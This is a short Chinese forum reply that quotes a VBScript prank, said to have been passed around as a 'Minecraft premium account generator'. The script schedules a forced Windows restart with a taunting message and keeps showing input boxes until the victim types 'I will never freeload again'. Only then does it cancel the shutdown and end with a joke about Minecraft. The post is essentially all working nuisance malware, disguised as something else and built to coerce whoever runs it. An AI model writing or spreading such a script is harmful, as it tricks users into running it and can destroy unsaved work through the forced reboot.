replies.txt_content:
星光aaa 发表于 2020-2-16 18:47
那个“我的世界正版账号生成器”。。。on error resume next
dim WSHshellA
set WSHshellA = wscript.createobject("wscript.shell")
WSHshellA.run "cmd.exe /c shutdown -r -t 180 -c ""说我再也不白嫖了，不说就一分钟关机，不信，试下···"" ",0 ,true
dim a
do while(a <> "我再也不白嫖了")
a = inputbox ("说我再也不白嫖了,就不关机，快撒，说 ""我再也不白嫖了""　","你不小心运行了病毒","",8000,7000)
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox"
loop
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛"
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd.exe /c shutdown -a",0 ,true
msgbox chr(13) + chr(13) + chr(13) + "我的世界不好玩，Minecraft才好玩"
